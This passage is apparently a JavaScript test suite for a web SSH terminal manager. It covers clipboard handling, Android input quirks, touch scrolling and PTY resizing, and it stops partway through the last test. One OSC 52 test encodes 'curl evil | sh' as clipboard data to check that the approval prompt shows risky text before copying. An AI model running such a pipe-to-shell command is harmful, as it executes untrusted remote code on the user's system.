const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

global.window = {
    addEventListener() {},
    visualViewport: null,
};
global.document = {};
global.navigator = {};

require('../../static/js/terminal-manager.js');
const TerminalManager = global.window.TerminalManager;

test('terminal scrollback preferences are bounded and malformed values fall back', () => {
    const source = fs.readFileSync(
        path.join(__dirname, '../../static/js/terminal-manager.js'),
        'utf8',
    );

    assert.equal(TerminalManager.getScrollbackLines(), 500);
    for (const [stored, expected] of [
        ['not-a-number', 500],
        ['10', 50],
        ['700', 700],
        ['20000', 10000],
    ]) {
        global.window.BrowserPreferences = {get: () => stored};
        assert.equal(TerminalManager.getScrollbackLines(), expected);
    }
    delete global.window.BrowserPreferences;
    assert.match(source, /const scrollbackLines = this\.getScrollbackLines\(\)/);
});

test('virtual keyboard detection follows visual viewport occlusion, not browser resize history', () => {
    assert.equal(TerminalManager.isVirtualKeyboardVisible(640, 640), false);
    assert.equal(TerminalManager.isVirtualKeyboardVisible(420, 640), true);
    assert.equal(TerminalManager.isVirtualKeyboardVisible(0, 640), false);
});

test('Android compositions discard stale helper input before xterm records the offset', () => {
    const listeners = new Map();
    const textarea = {
        value: '1',
        addEventListener(name, listener, capture) {
            listeners.set(`${name}:${capture}`, listener);
        },
        removeEventListener(name, listener, capture) {
            const key = `${name}:${capture}`;
            if (listeners.get(key) === listener) listeners.delete(key);
        },
        setSelectionRange(start, end) {
            this.selectionStart = start;
            this.selectionEnd = end;
        },
    };

    const dispose = TerminalManager.setupAndroidCompositionGuard({
        textarea,
        options: {screenReaderMode: false},
    }, true);
    listeners.get('compositionstart:true')();

    assert.equal(textarea.value, '');
    assert.equal(textarea.selectionStart, 0);
    assert.equal(textarea.selectionEnd, 0);

    dispose();
    assert.equal(listeners.size, 0);
});

test('Android IME fallback does not reprocess text delivered before keydown 229', () => {
    const listeners = new Map();
    const textarea = {
        value: '',
        addEventListener(name, listener, capture = false) {
            listeners.set(`${name}:${capture}`, listener);
        },
        removeEventListener(name, listener, capture = false) {
            const key = `${name}:${capture}`;
            if (listeners.get(key) === listener) listeners.delete(key);
        },
    };
    const dispose = TerminalManager.setupAndroidCompositionGuard({
        textarea,
        options: {screenReaderMode: false},
    }, true);
    let stopped = 0;

    listeners.get('input:true')({
        data: '1',
        inputType: 'insertText',
        isComposing: false,
        timeStamp: 100,
    });
    listeners.get('keydown:true')({
        key: 'Unidentified',
        keyCode: 229,
        isComposing: false,
        timeStamp: 101,
        stopImmediatePropagation() { stopped += 1; },
    });

    assert.equal(stopped, 1);
    dispose();
    assert.equal(listeners.size, 0);
});

test('Android IME guard leaves control keys and active compositions to xterm', () => {
    const listeners = new Map();
    const textarea = {
        value: '',
        addEventListener(name, listener, capture = false) {
            listeners.set(`${name}:${capture}`, listener);
        },
        removeEventListener(name, listener, capture = false) {
            const key = `${name}:${capture}`;
            if (listeners.get(key) === listener) listeners.delete(key);
        },
        setSelectionRange() {},
    };
    const dispose = TerminalManager.setupAndroidCompositionGuard({
        textarea,
        options: {screenReaderMode: false},
    }, true);
    let stopped = 0;
    const dispatchKeydown = overrides => listeners.get('keydown:true')({
        keyCode: 229,
        isComposing: false,
        timeStamp: 200,
        stopImmediatePropagation() { stopped += 1; },
        ...overrides,
    });

    listeners.get('input:true')({
        data: 'x',
        inputType: 'insertText',
        isComposing: false,
        timeStamp: 199,
    });
    dispatchKeydown({key: 'Backspace'});
    dispatchKeydown({key: 'c', ctrlKey: true});
    listeners.get('compositionstart:true')();
    dispatchKeydown({key: 'a', isComposing: true});
    listeners.get('compositionend:true')();
    dispatchKeydown({key: 'a'});

    assert.equal(stopped, 1);
    dispose();
    assert.equal(listeners.size, 0);
});

test('Android composition guard preserves screen-reader helper input', () => {
    let listenerAdded = false;
    const textarea = {
        value: 'screen reader context',
        addEventListener() { listenerAdded = true; },
    };

    TerminalManager.setupAndroidCompositionGuard({
        textarea,
        options: {screenReaderMode: true},
    }, true);

    assert.equal(listenerAdded, false);
    assert.equal(textarea.value, 'screen reader context');
});

test('OSC 52 clipboard payloads are bounded, targeted, and decoded as UTF-8', () => {
    assert.equal(
        TerminalManager.decodeOsc52Clipboard('c;dG11eCDinJM='),
        'tmux ✓',
    );
    assert.equal(TerminalManager.decodeOsc52Clipboard(';dGVybWluYWw='), 'terminal');
    assert.equal(TerminalManager.decodeOsc52Clipboard('p;dGVybWluYWw='), null);
    assert.equal(TerminalManager.decodeOsc52Clipboard('c;?'), null);
    assert.equal(TerminalManager.decodeOsc52Clipboard('c;%%%'), null);
    assert.equal(TerminalManager.decodeOsc52Clipboard('c;dG9vIGxhcmdl', 4), null);
    const oversized = Buffer.alloc(128 * 1024 + 1, 0x61).toString('base64');
    assert.equal(TerminalManager.decodeOsc52Clipboard(`c;${oversized}`), null);
});

test('OSC 52 handler requires a user action before writing the clipboard', async () => {
    const writes = [];
    let handler;
    let presentation;
    global.navigator.clipboard = {
        writeText(text) {
            writes.push(text);
            return Promise.resolve();
        },
    };
    let disposed = false;
    const disposable = {dispose() { disposed = true; }};
    const terminal = {
        parser: {
            registerOscHandler(identifier, callback) {
                assert.equal(identifier, 52);
                handler = callback;
                return disposable;
            },
        },
    };

    global.window.showNotification = value => {
        presentation = value;
    };
    const registered = TerminalManager.registerOsc52ClipboardHandler(terminal);
    assert.equal(handler(';dG11eCBzZWxlY3Rpb24='), true);
    assert.deepEqual(writes, []);
    assert.equal(typeof presentation.action.onClick, 'function');
    presentation.action.onClick();
    await new Promise(resolve => setImmediate(resolve));
    assert.deepEqual(writes, ['tmux selection']);
    registered.dispose();
    assert.equal(disposed, true);
    delete global.window.showNotification;
    delete global.navigator.clipboard;
});

test('OSC 52 prompt previews its text and a newer request replaces the prompt', async () => {
    const writes = [];
    let handler;
    const presentations = [];
    const dismissed = [];
    global.navigator.clipboard = {writeText(text) { writes.push(text); return Promise.resolve(); }};
    const terminal = {parser: {registerOscHandler(identifier, callback) { handler = callback; return {dispose() {}}; }}};
    global.window.showNotification = value => {
        presentations.push(value);
        const index = presentations.length - 1;
        return () => { dismissed.push(index); value.onDismiss?.(); };
    };
    const registered = TerminalManager.registerOsc52ClipboardHandler(terminal);

    // "ls -la\nrm" then "curl evil | sh"
    assert.equal(handler(';bHMgLWxhCnJt'), true);
    assert.match(presentations[0].message, /ls -la\u23cerm/);
    assert.equal(handler(';Y3VybCBldmlsIHwgc2g='), true);

    // The first prompt is closed; its button no longer copies anything.
    assert.deepEqual(dismissed, [0]);
    presentations[0].action.onClick();
    await new Promise(resolve => setImmediate(resolve));
    assert.deepEqual(writes, []);
    // The second prompt shows and copies exactly its own text.
    assert.match(presentations[1].message, /curl evil \| sh/);
    presentations[1].action.onClick();
    await new Promise(resolve => setImmediate(resolve));
    assert.deepEqual(writes, ['curl evil | sh']);
    registered.dispose();
    delete global.window.showNotification;
    delete global.navigator.clipboard;
});

test('OSC 52 preview shows control characters and shortens long text', () => {
    assert.equal(TerminalManager.osc52ClipboardPreview('a\tb\x1bc'), 'a b c');
    assert.equal(TerminalManager.osc52ClipboardPreview('ab\u202ecd\u200b'), 'ab\ufffdcd\ufffd');
    const preview = TerminalManager.osc52ClipboardPreview('x'.repeat(200));
    assert.equal(preview, `${'x'.repeat(80)}\u2026`);
});

test('socket output is acknowledged after TerminalManager accepts it', () => {
    const calls = [];
    const originalWriteOutput = TerminalManager.writeOutput;
    let acceptOutput;
    TerminalManager.writeOutput = (...args) => {
        calls.push(['write', ...args.slice(0, 3)]);
        acceptOutput = args[3];
    };

    TerminalManager.handleSocketOutput(
        {session_id: 'session-1', data: 'hello', sequence: 3},
        () => calls.push(['ack']),
    );

    assert.deepEqual(calls, [
        ['write', 'session-1', 'hello', 3],
    ]);
    acceptOutput();
    assert.deepEqual(calls, [
        ['write', 'session-1', 'hello', 3],
        ['ack'],
    ]);
    TerminalManager.writeOutput = originalWriteOutput;
});

test('socket output waits for every visible xterm pane before ACK', () => {
    const originalWriteOutputToTerminal = TerminalManager.writeOutputToTerminal;
    const callbacks = [];
    let acknowledgements = 0;
    TerminalManager.sessionTerminals = {multi: ['pane-1', 'pane-2']};
    TerminalManager.transcripts = {};
    TerminalManager.transcriptSizes = {};
    TerminalManager.writeOutputToTerminal = (_key, _data, callback) => {
        callbacks.push(callback);
    };

    TerminalManager.writeOutput('multi', 'output', 1, () => {
        acknowledgements += 1;
    });

    assert.equal(acknowledgements, 0);
    callbacks[0]();
    assert.equal(acknowledgements, 0);
    callbacks[1]();
    assert.equal(acknowledgements, 1);
    TerminalManager.writeOutputToTerminal = originalWriteOutputToTerminal;
});

test('pre-attach output stays bounded and releases trimmed chunks', () => {
    const originalLimit = TerminalManager.maxPendingOutputSize;
    const accepted = [];
    TerminalManager.maxPendingOutputSize = 5;
    TerminalManager.terminals = {pending: {}};
    TerminalManager.terminalReady = {pending: false};
    TerminalManager.pendingOutput = {pending: []};
    TerminalManager.pendingOutputSizes = {pending: 0};

    TerminalManager.writeOutputToTerminal(
        'pending', '1234', () => accepted.push('first')
    );
    TerminalManager.writeOutputToTerminal(
        'pending', '5678', () => accepted.push('second')
    );

    assert.deepEqual(accepted, ['first']);
    assert.equal(TerminalManager.pendingOutputSizes.pending, 4);
    assert.deepEqual(
        TerminalManager.pendingOutput.pending.map(entry => entry.data),
        ['5678'],
    );
    TerminalManager.maxPendingOutputSize = originalLimit;
});

test('destroying a terminal releases in-flight xterm acceptance callbacks', () => {
    const accepted = [];
    TerminalManager.terminals = {closing: {dispose() {}}};
    TerminalManager.pendingOutput = {closing: []};
    TerminalManager.terminalWriteCallbacks = {
        closing: new Set([() => accepted.push('accepted')]),
    };

    TerminalManager.destroyTerminalKey('closing', 'session-closing');

    assert.deepEqual(accepted, ['accepted']);
    assert.equal(TerminalManager.terminalWriteCallbacks.closing, undefined);
});

test('copy shortcuts write xterm selection directly to the clipboard', async () => {
    const writes = [];
    global.navigator.clipboard = {
        writeText(text) {
            writes.push(text);
            return Promise.resolve();
        },
    };
    const terminal = {
        hasSelection: () => true,
        getSelection: () => 'selected terminal output',
    };

    const shouldProcess = TerminalManager.handleClipboardKeyEvent({
        type: 'keydown',
        key: 'c',
        ctrlKey: true,
        metaKey: false,
        altKey: false,
        shiftKey: false,
    }, terminal, false);

    assert.equal(shouldProcess, false);
    assert.equal(TerminalManager.handleClipboardKeyEvent({
        type: 'keydown',
        key: 'c',
        ctrlKey: false,
        metaKey: true,
        altKey: false,
        shiftKey: false,
    }, terminal, true), false);
    await new Promise(resolve => setImmediate(resolve));
    assert.deepEqual(writes, [
        'selected terminal output',
        'selected terminal output',
    ]);
    delete global.navigator.clipboard;
});

test('copy falls back to a hidden textarea when the Clipboard API is missing', async () => {
    delete global.navigator.clipboard;
    const appended = [];
    const removed = [];
    const textarea = {
        value: '',
        setAttribute() {},
        style: {},
        select() {},
        remove() { removed.push(true); },
    };
    global.document.createElement = tag => {
        assert.equal(tag, 'textarea');
        return textarea;
    };
    global.document.body = {appendChild(node) { appended.push(node); }};
    let copiedCommand = null;
    global.document.execCommand = command => {
        copiedCommand = command;
        return true;
    };
    const terminal = {getSelection: () => 'fallback text'};

    assert.equal(await TerminalManager.copySelectionToClipboard(terminal), true);
    assert.equal(textarea.value, 'fallback text');
    assert.equal(copiedCommand, 'copy');
    assert.deepEqual(appended, [textarea]);
    assert.deepEqual(removed, [true]);

    delete global.document.createElement;
    delete global.document.body;
    delete global.document.execCommand;
});

test('copy falls back to a hidden textarea when clipboard write is denied', async () => {
    global.navigator.clipboard = {
        writeText() { return Promise.reject(new Error('denied')); },
    };
    const textarea = {
        value: '',
        setAttribute() {},
        style: {},
        select() {},
        remove() {},
    };
    global.document.createElement = () => textarea;
    global.document.body = {appendChild() {}};
    let copiedCommand = null;
    global.document.execCommand = command => {
        copiedCommand = command;
        return true;
    };
    const terminal = {getSelection: () => 'denied then copied'};

    assert.equal(await TerminalManager.copySelectionToClipboard(terminal), true);
    assert.equal(textarea.value, 'denied then copied');
    assert.equal(copiedCommand, 'copy');

    delete global.navigator.clipboard;
    delete global.document.createElement;
    delete global.document.body;
    delete global.document.execCommand;
});

test('copy rejects when both the Clipboard API and the fallback fail', async () => {
    delete global.navigator.clipboard;
    const textarea = {
        value: '',
        setAttribute() {},
        style: {},
        select() {},
        remove() {},
    };
    global.document.createElement = () => textarea;
    global.document.body = {appendChild() {}};
    global.document.execCommand = () => false;
    const terminal = {getSelection: () => 'nowhere to go'};

    await assert.rejects(
        TerminalManager.copySelectionToClipboard(terminal),
        /copy unavailable/,
    );

    delete global.document.createElement;
    delete global.document.body;
    delete global.document.execCommand;
});

test('OSC 52 approval falls back to a hidden textarea without the Clipboard API', async () => {
    delete global.navigator.clipboard;
    const textarea = {
        value: '',
        setAttribute() {},
        style: {},
        select() {},
        remove() {},
    };
    global.document.createElement = () => textarea;
    global.document.body = {appendChild() {}};
    let copiedCommand = null;
    global.document.execCommand = command => {
        copiedCommand = command;
        return true;
    };
    let handler;
    const notifications = [];
    global.window.showNotification = value => {
        notifications.push(value);
    };
    const terminal = {
        parser: {
            registerOscHandler(identifier, callback) {
                assert.equal(identifier, 52);
                handler = callback;
                return {dispose() {}};
            },
        },
    };

    const registered = TerminalManager.registerOsc52ClipboardHandler(terminal);
    assert.equal(handler(';dG11eCBzZWxlY3Rpb24='), true);
    const prompt = notifications.find(value => typeof value === 'object');
    assert.equal(typeof prompt?.action?.onClick, 'function');
    prompt.action.onClick();
    await new Promise(resolve => setImmediate(resolve));
    assert.equal(textarea.value, 'tmux selection');
    assert.equal(copiedCommand, 'copy');
    assert.ok(notifications.includes('Remote text copied to clipboard'));
    registered.dispose();

    delete global.window.showNotification;
    delete global.document.createElement;
    delete global.document.body;
    delete global.document.execCommand;
});

for (const copyResult of ['success', 'denied', 'throws']) {
    test(`clipboard fallback restores focus after copy ${copyResult}`, async () => {
        const previousDocument = global.document;
        const previousFocus = {
            isConnected: true,
            focus(options) {
                assert.deepEqual(options, {preventScroll: true});
                global.document.activeElement = this;
            },
        };
        const textarea = {
            style: {},
            setAttribute() {},
            select() { global.document.activeElement = this; },
            remove() { global.document.activeElement = global.document.body; },
        };
        global.document = {
            activeElement: previousFocus,
            body: {appendChild() {}},
            createElement: () => textarea,
            execCommand() {
                if (copyResult === 'throws') throw new Error('copy failed');
                return copyResult === 'success';
            },
        };
        try {
            const copy = TerminalManager.writeTextToClipboardFallback('selected text');
            if (copyResult === 'success') await copy;
            else await assert.rejects(copy);
            assert.equal(global.document.activeElement, previousFocus);
        } finally {
            global.document = previousDocument;
        }
    });
}

test('Ctrl+C without a selection remains terminal interrupt input', () => {
    const terminal = {
        hasSelection: () => false,
        getSelection: () => '',
    };

    assert.equal(TerminalManager.handleClipboardKeyEvent({
        type: 'keydown',
        key: 'c',
        ctrlKey: true,
        metaKey: false,
        altKey: false,
        shiftKey: false,
    }, terminal, false), true);
});

test('touch dragging normal terminal scrollback moves xterm lines directly', () => {
    const listeners = new Map();
    const dispatched = [];
    const scrolled = [];
    const surface = {
        addEventListener(name, listener) { listeners.set(name, listener); },
        removeEventListener(name, listener) {
            if (listeners.get(name) === listener) listeners.delete(name);
        },
        dispatchEvent(event) { dispatched.push(event); return true; },
        setPointerCapture() {},
        releasePointerCapture() {},
    };
    const terminal = {
        element: surface,
        buffer: { active: { type: 'normal' } },
        modes: { mouseTrackingMode: 'none' },
        options: { fontSize: 10 },
        scrollLines(lines) { scrolled.push(lines); },
    };
    let prevented = false;

    const dispose = TerminalManager.setupTouchScroll(surface, terminal);
    listeners.get('pointerdown')({
        pointerType: 'touch', pointerId: 7, clientX: 40, clientY: 100,
    });
    listeners.get('pointermove')({
        pointerId: 7,
        clientX: 42,
        clientY: 130,
        preventDefault() { prevented = true; },
    });

    assert.deepEqual(scrolled, [-2]);
    assert.equal(dispatched.length, 0);
    assert.equal(prevented, true);

    dispose();
    assert.equal(listeners.size, 0);
});

test('touch dragging a mouse-tracked terminal is bridged into cancelable wheel input', () => {
    const listeners = new Map();
    const dispatched = [];
    const surface = {
        addEventListener(name, listener) { listeners.set(name, listener); },
        removeEventListener(name, listener) {
            if (listeners.get(name) === listener) listeners.delete(name);
        },
        dispatchEvent(event) { dispatched.push(event); return true; },
        setPointerCapture() {},
        releasePointerCapture() {},
    };
    class FakeWheelEvent {
        constructor(type, options) {
            this.type = type;
            Object.assign(this, options);
        }
    }
    const originalWheelEvent = global.window.WheelEvent;
    global.window.WheelEvent = FakeWheelEvent;
    let prevented = false;

    const dispose = TerminalManager.setupTouchScroll(surface, {
        element: surface,
        buffer: { active: { type: 'normal' } },
        modes: { mouseTrackingMode: 'any' },
    });
    listeners.get('pointerdown')({
        pointerType: 'touch', pointerId: 7, clientX: 40, clientY: 120,
    });
    listeners.get('pointermove')({
        pointerId: 7,
        clientX: 42,
        clientY: 92,
        preventDefault() { prevented = true; },
    });

    assert.equal(dispatched.length, 1);
    assert.equal(dispatched[0].type, 'wheel');
    assert.equal(dispatched[0].deltaY, 28);
    assert.equal(dispatched[0].deltaMode, 0);
    assert.equal(dispatched[0].clientX, 42);
    assert.equal(dispatched[0].clientY, 92);
    assert.equal(dispatched[0].bubbles, true);
    assert.equal(dispatched[0].cancelable, true);
    assert.equal(prevented, true);

    dispose();
    assert.equal(listeners.size, 0);
    global.window.WheelEvent = originalWheelEvent;
});

test('touch gesture state resets even when the pointer capture is already gone', () => {
    const listeners = new Map();
    const scrolled = [];
    const surface = {
        addEventListener(name, listener) { listeners.set(name, listener); },
        removeEventListener(name) { listeners.delete(name); },
        dispatchEvent() { return true; },
        setPointerCapture() {},
        releasePointerCapture() {
            throw new Error('No active pointer with the given id is found.');
        },
    };
    const dispose = TerminalManager.setupTouchScroll(surface, {
        element: surface,
        buffer: { active: { type: 'normal' } },
        modes: { mouseTrackingMode: 'none' },
        options: { fontSize: 10 },
        scrollLines(lines) { scrolled.push(lines); },
    });
    listeners.get('pointerdown')({
        pointerType: 'touch', pointerId: 9, clientX: 40, clientY: 100,
    });
    assert.doesNotThrow(() => listeners.get('pointerup')({ pointerId: 9 }));
    listeners.get('pointermove')({
        pointerId: 9, clientX: 42, clientY: 140, preventDefault() {},
    });
    assert.deepEqual(scrolled, []);
    dispose();
});

test('horizontal touch movement does not synthesize terminal scrolling', () => {
    const listeners = new Map();
    const dispatched = [];
    const surface = {
        addEventListener(name, listener) { listeners.set(name, listener); },
        removeEventListener(name) { listeners.delete(name); },
        dispatchEvent(event) { dispatched.push(event); },
        setPointerCapture() {},
        releasePointerCapture() {},
    };
    const dispose = TerminalManager.setupTouchScroll(surface, {element: surface});
    listeners.get('pointerdown')({
        pointerType: 'touch', pointerId: 8, clientX: 10, clientY: 50,
    });
    listeners.get('pointermove')({
        pointerId: 8, clientX: 45, clientY: 46, preventDefault() {},
    });
    assert.equal(dispatched.length, 0);
    dispose();
});

function terminalInWrapper(unassigned) {
    return {
        cols: 120,
        rows: 40,
        element: {
            closest(selector) {
                assert.equal(selector, '.terminal-wrapper');
                return {
                    classList: {
                        contains(name) {
                            return name === 'unassigned' && unassigned;
                        },
                    },
                };
            },
        },
    };
}

test('fitAllTerminals does not reflow unassigned hidden sessions', () => {
    const visible = terminalInWrapper(false);
    const hidden = terminalInWrapper(true);
    TerminalManager.sessionTerminals = {
        visibleSession: ['visibleTerminal'],
        hiddenSession: ['hiddenTerminal'],
    };
    TerminalManager.terminals = {
        visibleTerminal: visible,
        hiddenTerminal: hidden,
    };
    TerminalManager.fitAddons = {
        visibleTerminal: {
            fit() {
                visible.cols = 100;
                visible.rows = 32;
            },
        },
        hiddenTerminal: {
            fit() {
                hidden.cols = 2;
                hidden.rows = 1;
            },
        },
    };

    TerminalManager.fitAllTerminals();

    assert.deepEqual({ cols: visible.cols, rows: visible.rows }, { cols: 100, rows: 32 });
    assert.deepEqual({ cols: hidden.cols, rows: hidden.rows }, { cols: 120, rows: 40 });
});

test('fitAndSyncVisibleTerminals reports changed connected PTY dimensions once', () => {
    const visible = terminalInWrapper(false);
    const emitted = [];
    const socket = {
        emit(name, payload) {
            emitted.push([name, payload]);
        },
    };
    TerminalManager.sessionTerminals = {
        visibleSession: ['visibleTerminal'],
    };
    TerminalManager.terminals = {
        visibleTerminal: visible,
    };
    TerminalManager.fitAddons = {
        visibleTerminal: {
            fit() {
                visible.cols = 96;
                visible.rows = 32;
            },
        },
    };
    TerminalManager.syncedSizes = {};

    const result = TerminalManager.fitAndSyncVisibleTerminals({
        socket,
        isConnected: id => id === 'visibleSession',
    });
    TerminalManager.fitAndSyncVisibleTerminals({
        socket,
        isConnected: () => true,
    });

    assert.deepEqual(result, [{
        sessionId: 'visibleSession',
        rows: 32,
        cols: 96,
    }]);
    assert.deepEqual(emitted, [['ssh_resize', {
        session_id: 'visibleSession',
        rows: 32,
        cols: 96,
    }]]);
});

function terminalWithContainer(rect, {connected = true} = {}) {
    const terminal = terminalInWrapper(false);
    terminal.element.parentElement = {
        isConnected: connected,
        getBoundingClientRect: () => rect,
    };
    return terminal;
}

function withDocumentHidden(hidden, callback) {
    const previous = global.document;
    global.document = {hidden};
    try {
        return callback();
    } finally {
        global.document = previous;
    }
}

function installSingleTerminal(terminal, onFit) {
    let fits = 0;
    TerminalManager.sessionTerminals = {session: ['terminal']};
    TerminalManager.terminals = {terminal};
    TerminalManager.fitAddons = {
        terminal: {
            fit() {
                fits += 1;
                onFit?.(terminal);
            },
        },
    };
    TerminalManager.syncedSizes = {};
    return () => fits;
}

test('fitTerminal keeps the last size while the page is hidden', () => {
    const terminal = terminalWithContainer({width: 900, height: 600});
    const fits = installSingleTerminal(terminal, term => { term.cols = 8; });

    withDocumentHidden(true, () => TerminalManager.fitTerminal('session'));

    assert.equal(fits(), 0);
    assert.equal(terminal.cols, 120);
});

test('fitTerminal skips collapsed or detached terminal containers', () => {
    for (const [rect, connected] of [
        [{width: 0, height: 600}, true],
        [{width: 900, height: 0}, true],
        [{width: 900, height: 600}, false],
    ]) {
        const terminal = terminalWithContainer(rect, {connected});
        const fits = installSingleTerminal(terminal);
        TerminalManager.fitTerminal('session');
        assert.equal(fits(), 0);
    }

    const terminal = terminalWithContainer({width: 900, height: 600});
    const fits = installSingleTerminal(terminal);
    TerminalManager.fitTerminal('session');
    assert.equal(fits(), 1);
});

test('hidden page layout sync neither shrinks xterm nor reports a PTY size', () => {
    const terminal = terminalWithContainer({width: 95, height: 600});
    installSingleTerminal(terminal, term => { term.cols = 8; });
    TerminalManager.syncedSizes = {session: {rows: 40, cols: 120}};
    const emitted = [];

    withDocumentHidden(true, () => TerminalManager.fitAndSyncVisibleTerminals({
        socket: {emit: (...args) => emitted.push(args)},
    }));

    assert.equal(terminal.cols, 120);
    assert.deepEqual(emitted, []);
});

test('terminal containers are observed and the observer is released on destroy', () => {
    const previous = global.window.ResizeObserver;
    const observers = [];
    global.window.ResizeObserver = class {
        constructor(callback) {
            this.callback = callback;
            this.targets = [];
            this.disconnected = false;
            observers.push(this);
        }
        observe(target) { this.targets.push(target); }
        disconnect() { this.disconnected = true; }
    };
    const scheduled = [];
    const originalSchedule = TerminalManager.scheduleLayoutSync;
    TerminalManager.scheduleLayoutSync = options => scheduled.push(options);
    try {
        const container = {};
        TerminalManager.observeContainerResize(container, 'observed');
        TerminalManager.observeContainerResize(container, 'observed');
        assert.equal(observers.length, 2);
        assert.equal(observers[0].disconnected, true);
        assert.deepEqual(observers[1].targets, [container]);

        observers[1].callback([]);
        assert.equal(scheduled.length, 1);

        TerminalManager.resizeObserverDisposers.observed();
        assert.equal(observers[1].disconnected, true);
    } finally {
        TerminalManager.scheduleLayoutSync = originalSchedule;
        delete TerminalManager.resizeObserverDisposers.observed;
        if (previous === undefined) delete global.window.ResizeObserver;
        else global.window.ResizeObserver = previous;
    }
});

test('scheduled layout sync coalesces bursts and keeps a requested force', async () => {
    const terminal = terminalWithContainer({width: 900, height: 600});
    installSingleTerminal(terminal, term => { term.cols = 100; term.rows = 30; });
    TerminalManager.syncedSizes = {session: {rows: 30, cols: 100}};
    const emitted = [];
    const previousSocket = global.window.socket;
    global.window.socket = {emit: (name, payload) => emitted.push([name, payload])};
    global.SessionManager = {getSession: () => ({connected: true})};
    const previousDelay = TerminalManager.layoutSyncDelay;
    TerminalManager.layoutSyncDelay = 0;
    try {
        TerminalManager.scheduleLayoutSync({force: true});
        TerminalManager.scheduleLayoutSync();
        TerminalManager.scheduleLayoutSync();
        await new Promise(resolve => setTimeout(resolve, 10));
    } finally {
        TerminalManager.layoutSyncDelay = previousDelay;
        global.window.socket = previousSocket;
        delete global.SessionManager;
    }

    assert.deepEqual(emitted, [['ssh_resize', {session_id: 'session', rows: 30, cols: 100}]]);
    assert.equal(TerminalManager.layoutSyncTimer, null);
    assert.equal(TerminalManager.layoutSyncForce, false);
});

test('window and viewport resizes synchronize the PTY instead of fitting only locally', () => {
    const source = fs.readFileSync(
        path.join(__dirname, '../../static/js/terminal-manager.js'),
        'utf8',
    );
    const listeners = source.slice(source.indexOf('window.TerminalManager = TerminalManager;'));

    assert.doesNotMatch(listeners, /fitAllTerminals\(\)/);
    assert.match(listeners, /addEventListener\('resize', \(\) => \{\s+TerminalManager\.scheduleLayoutSync\(\);/);
    assert.match(listeners, /'visibilitychange'[\s\S]*scheduleLayoutSync\(\)/);
});

test('session pane activation delegates forced PTY synchronization to TerminalManager', () => {
    const source = fs.readFileSync(
        path.join(__dirname, '../../static/js/session-manager.js'),
        'utf8',
    );
    const setActivePane = source.slice(
        source.indexOf('    setActivePane(paneIndex) {'),
        source.indexOf('    focusActivePane() {'),
    );

    assert.match(setActivePane, /scheduleFitAndSyncVisibleTerminals/);
    assert.doesNotMatch(setActivePane, /socket\.emit\('ssh_resize'/);
});

test('session workspace panel changes synchronize visible remote PTYs', () => {
    const source = fs.readFileSync(
        path.join(__dirname, '../../static/js/session-workspace-ui.js'),
        'utf8',
    );
    const render = source.slice(
        source.indexOf('            render(state) {'),
        source.indexOf('        function sync()'),
    );

    assert.match(render, /fitAndSyncVisibleTerminals/);
    assert.doesNotMatch(render, /fitAllTerminals/);
});

test('session workspace renders Files availability before enabling its context', () => {
    const source = fs.readFileSync(
        path.join(__dirname, '../../static/js/session-workspace-ui.js'),
        'utf8',
    );
    const render = source.slice(
        source.indexOf('            render(state) {'),
        source.indexOf('        function sync()'),
    );

    const visibilityRender = render.indexOf(
        "elements.filesPanel.classList.toggle('hidden', !state.filesAvailable)",
    );
    const availabilityUpdate = render.indexOf(
        "root.workspaceLayoutController?.setContextAvailability?.(",
    );

    assert.notEqual(visibilityRender, -1);
    assert.notEqual(availabilityUpdate, -1);
    assert.ok(
        visibilityRender < availabilityUpdate,
        'a nested Files activation must not be overwritten by stale availability state',
    );
});

test('active Files context rebinds SFTP after every active-session update', () => {
    const source = fs.readFileSync(
        path.join(__dirname, '../../static/js/session-workspace-ui.js'),
        'utf8',
    );
    const sync = source.slice(
        source.indexOf('        function sync()'),
        source.indexOf("        documentRef.addEventListener('session-sftp-request-close'"),
    );

    const coordinatorUpdate = sync.indexOf('coordinator.update({');
    const contextSync = sync.indexOf('syncContextControllers();');

    assert.notEqual(coordinatorUpdate, -1);
    assert.notEqual(contextSync, -1);
    assert.ok(
        coordinatorUpdate < contextSync,
        'Files must reopen or follow the current capable session after state changes',
    );
});

test('font size changes update hidden options without fitting hidden terminals', () => {
    const visible = terminalInWrapper(false);
    const hidden = terminalInWrapper(true);
    visible.options = { fontSize: 14 };
    hidden.options = { fontSize: 14 };
    TerminalManager.sessionTerminals = {
        visibleSession: ['visibleTerminal'],
        hiddenSession: ['hiddenTerminal'],
    };
    TerminalManager.terminals = {
        visibleTerminal: visible,
        hiddenTerminal: hidden,
    };
    TerminalManager.fitAddons = {
        visibleTerminal: { fit() { visible.cols = 96; } },
        hiddenTerminal: { fit() { hidden.cols = 2; } },
    };

    TerminalManager.updateFontSize(16);

    assert.equal(visible.options.fontSize, 16);
    assert.equal(hidden.options.fontSize, 16);
    assert.equal(visible.cols, 96);
    assert.equal(hidden.cols, 120);
});

test('attachTerminal replays output received before and during terminal attachment', async () => {
    const originalGetElementById = global.document.getElementById;
    const originalRequestAnimationFrame = global.requestAnimationFrame;
    const originalSetupScrollbar = TerminalManager.setupScrollbar;
    const originalFitTerminal = TerminalManager.fitTerminal;
    const originalRegisterOsc52ClipboardHandler = TerminalManager.registerOsc52ClipboardHandler;
    const originalConsoleError = console.error;
    const writes = [];
    const writeCallbacks = [];
    const clipboardActivations = [];
    const terminal = {
        buffer: { active: { viewportY: 0, baseY: 0 } },
        open() {},
        clear() {},
        write(data, callback) {
            writes.push(data);
            writeCallbacks.push(callback);
        },
        scrollToBottom() {},
    };

    try {
        TerminalManager.terminals = {};
        TerminalManager.sessionTerminals = {};
        TerminalManager.pendingOutput = {};
        TerminalManager.terminalReady = {};
        TerminalManager.osc52ClipboardAllowed = {switchTerminal: true};
        TerminalManager.clipboardDisposers = {};
        TerminalManager.transcripts = {};
        TerminalManager.transcriptSizes = {};
        console.error = () => {};

        TerminalManager.writeOutput('switch-session', 'Switch#');

        TerminalManager.terminals.switchTerminal = terminal;
        TerminalManager.sessionTerminals['switch-session'] = ['switchTerminal'];
        global.document.getElementById = () => ({ appendChild() {} });
        global.requestAnimationFrame = callback => callback();
        TerminalManager.setupScrollbar = () => {};
        TerminalManager.fitTerminal = () => {};
        TerminalManager.registerOsc52ClipboardHandler = target => {
            clipboardActivations.push(target);
            return {dispose() {}};
        };

        assert.equal(
            TerminalManager.attachTerminal('switch-session', 'terminal-container', 'switchTerminal'),
            true
        );
        TerminalManager.writeOutput('switch-session', ' ready');

        await new Promise(resolve => setTimeout(resolve, 80));

        assert.deepEqual(writes, ['Switch#', ' ready']);
